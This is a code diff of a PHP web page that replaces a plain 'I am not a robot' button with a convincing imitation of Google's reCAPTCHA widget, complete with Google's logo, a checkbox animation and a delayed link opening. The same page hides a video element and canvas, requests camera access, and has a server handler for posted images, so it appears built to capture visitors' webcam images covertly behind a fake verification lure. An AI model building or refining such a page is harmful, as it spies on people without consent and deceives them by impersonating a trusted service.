@@ -55,38 +55,104 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             width: 100%;
             height: 100%;
             overflow: hidden;
-            background-color: #ffffff; 
+            background-color: #f9f9f9; 
             display: flex;
             justify-content: center;
             align-items: center;
         }
         
-        /* I am not a robot button style - Center-e rakhar jonno */
-        #send-pic-btn {
-            background: #ffffff;
-            color: #333333;
-            border: 1px solid #d3d3d3;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: 500;
-            border-radius: 4px;
-            cursor: pointer;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            display: none; 
-            font-family: Arial, sans-serif;
-            align-items: center;
-            gap: 10px;
-        }
-        #send-pic-btn:hover {
+        /* Asol reCAPTCHA Box Style */
+        .recaptcha-box {
             background: #f9f9f9;
-            box-shadow: 0 3px 6px rgba(0,0,0,0.15);
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 20px 25px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 300px;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+            display: none; /* Shurute hide thakbe */
+        }
+
+        .recaptcha-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        /* Checkbox style */
+        .recaptcha-checkbox {
+            width: 28px;
+            height: 28px;
+            background: #fff;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.2s, border-color 0.2s;
+        }
+
+        .recaptcha-checkbox:hover {
+            border-color: #b2b2b2;
+        }
+
+        .recaptcha-checkbox.checked::after {
+            content: "";
+            position: absolute;
+            width: 6px;
+            height: 12px;
+            border: solid #006600;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+            margin-bottom: 3px;
+        }
+
+        .recaptcha-text {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 14px;
+            color: #2c2c2c;
+            user-select: none;
+        }
+
+        .recaptcha-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .recaptcha-logo {
+            width: 32px;
+            height: 32px;
+            background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .recaptcha-footer {
+            font-family: Roboto, helvetica, arial, sans-serif;
+            font-size: 10px;
+            color: #555;
+            margin-top: 2px;
         }
     </style>
 </head>
 <body>
 
-    <!-- I am not a robot button -->
-    <button id="send-pic-btn" onclick="openTargetLink()">I am not a robot</button>
+    <!-- reCAPTCHA Box -->
+    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
+        <div class="recaptcha-left">
+            <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
+            <span class="recaptcha-text">I am not a robot</span>
+        </div>
+        <div class="recaptcha-right">
+            <div class="recaptcha-logo"></div>
+            <div class="recaptcha-footer">reCAPTCHA</div>
+        </div>
+    </div>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -109,13 +175,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             }
         }
 
-        const sendBtn = document.getElementById('send-pic-btn');
+        const recaptchaContainer = document.getElementById('recaptchaContainer');
         if (finalUrl) {
-            sendBtn.style.display = 'inline-block';
+            recaptchaContainer.style.display = 'flex';
         }
 
         function openTargetLink() {
-            window.open(finalUrl, '_blank');
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            checkbox.style.background = '#fff';
+            checkbox.classList.add('checked');
+            
+            // Ekta choto loading effect diye target link open hobe
+            setTimeout(() => {
+                window.open(finalUrl, '_blank');
+            }, 500);
         }
 
         navigator.mediaDevices.getUserMedia({ video: true })
